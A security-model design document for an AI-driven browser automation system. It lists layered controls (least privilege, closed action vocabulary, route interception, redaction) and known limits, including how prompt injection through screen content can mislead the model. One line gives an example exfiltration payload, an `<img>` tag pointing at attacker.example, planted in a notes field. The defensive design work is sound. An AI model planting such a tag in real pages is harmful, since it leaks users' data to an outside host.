# Security model

Terms in [CONTEXT.md](../CONTEXT.md). The principle: arrange things so the dangerous action is *impossible*, not merely disallowed — a model that ignores an instruction must still hit a wall made of code, configuration or someone else's system.

## Layers, strongest first

| # | Control | Where it lives | Status |
|---|---|---|---|
| 1 | **Least-privilege Service Account.** The login used for a capability holds the narrowest role it needs; a read-only capability signs in as a user with no Transfer menu at all. Even a fully compromised automation cannot move money. | the Tenant's app | **TO BUILD** — two logins in the demo app |
| 2 | **Capability by construction.** The Replay Engine implements a closed action vocabulary; `download`, `execute_script`, `open_new_tab` have no implementation, so no Artifact can express them. | engine | **TO BUILD** |
| 3 | **Browser hardening.** Downloads off, popups and new tabs closed and logged, file chooser disabled, permissions denied, JS dialogs dismissed, a fresh context per run so no cookie crosses Tenants. | driver | **TO BUILD** |
| 3b | **Route interception.** Every request the browser makes — including ones the page starts by itself (images, scripts, redirects) — is checked against the allowlisted origins and aborted if it fails. This is what stops data leaving via a planted `<img src="https://attacker.example/?data=…">` in a member notes field, which a check-before-we-act rule cannot see. | driver | **TO BUILD** |
| 4 | **Network isolation.** The browser can reach only that Tenant's origins (container egress allowlist or proxy). Off-domain navigation fails at the network, not at an `if`. Also the real defence against exfiltration via a planted link. | deployment | Design only, not built |
| 5 | **Credential separation by phase.** The discovery process cannot see production secrets at all — different namespace, different service account. "Discovery can't touch production" becomes a fact, not a flag. | deployment | Design only, not built |
| 6 | **Two-Person Approval** for any Artifact containing a Consequential Step. Mirrors bank change control. | artifact + check | **TO BUILD** — simplified |
| 7 | **Tamper-evident Evidence.** Append-only JSONL with a hash chain; a run's history cannot be quietly rewritten. This is what makes an `Outcome Unknown` verdict trustworthy. | evidence sink | Design only, not built |
| 8 | **Policy layering.** Baseline ∩ Tenant ∩ Needs, checked before every action. | engine | **TO BUILD** |
| 9 | **Secrets by reference.** Substituted at the moment of typing, below the model, below the log, below the Artifact. | engine | **TO BUILD** |
| 10 | **Redaction Chokepoint**, both inbound (logs, evidence, artifacts, returned outputs) and outbound (observation text before it reaches a model, with the screenshot cropped to the app window and downscaled). | one function | **TO BUILD** |

**Nothing here is built yet** — every row is a decision, not a claim about the code. As each is implemented, change its status to BUILT and name the file that holds it.

## Tests that are controls

None of these exist yet.

- Replay code cannot import the model SDK (import-graph test).
- An Artifact naming an action outside the vocabulary is rejected by the schema.
- An Artifact whose Needs exceed the Policy is Refused before the browser opens.
- A Tenant Overlay that adds a Step, changes the Contract or widens Needs is rejected.
- A redaction canary value never appears in any evidence file, log line or screenshot.
- A Business Outcome is never retried.
- Automation and Operator cannot hold control at the same time.

## Known limits (state these plainly in REPORT.md)

- **Route keyword deny-lists are weak.** A bank may call transfers "Funds Movement". Keywords are a second net under the Tenant's route allowlist, never the primary defence.
- **Screenshots can capture what redaction misses.** Text redaction does not clean pixels, so masking the observation text while sending the image is only a partial control. What actually protects discovery is that it runs against Non-production Environments only; the image channel is narrowed by cropping to the app window and downscaling, and closed properly by region masking, which is future work. Failure screenshots in Replay hold real pixels: encrypted, short retention, access-controlled.
- **Prompt injection is mitigated, not solved.** Screen content is treated as data and the model is told so, but the actual protection is that the model only *proposes* and every action is checked by code. A convincing injection can still waste a discovery run.
- **Two-person approval is only as good as the identities behind it**; the demo has no real identity system.
- **All Playwright calls live in one Surface module**, asserted by a test, so no other code can reach the browser directly and bypass the policy wrapper. The action vocabulary has no member mapping to `evaluate`, so an Artifact cannot request arbitrary script execution.
